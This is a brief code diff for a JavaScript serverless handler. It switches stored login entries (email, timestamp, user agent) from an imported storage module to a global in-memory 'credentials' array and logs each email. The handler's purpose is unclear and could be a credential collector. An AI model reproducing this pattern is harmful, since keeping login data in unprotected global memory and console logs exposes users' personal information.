@@ -1,4 +1,7 @@
-import { storage } from './storage.js';
+// Global storage that persists across function calls
+if (!global.credentials) {
+    global.credentials = [];
+}
 
 export default async function handler(req, res) {
     // Enable CORS
@@ -33,8 +36,8 @@ export default async function handler(req, res) {
         userAgent: req.headers['user-agent']
     };
 
-    // Store in shared storage
-    storage.addCredential(loginEntry);
+    // Store in global storage
+    global.credentials.push(loginEntry);
 
     console.log(`New login stored: ${email} at ${loginEntry.timestamp}`);
 
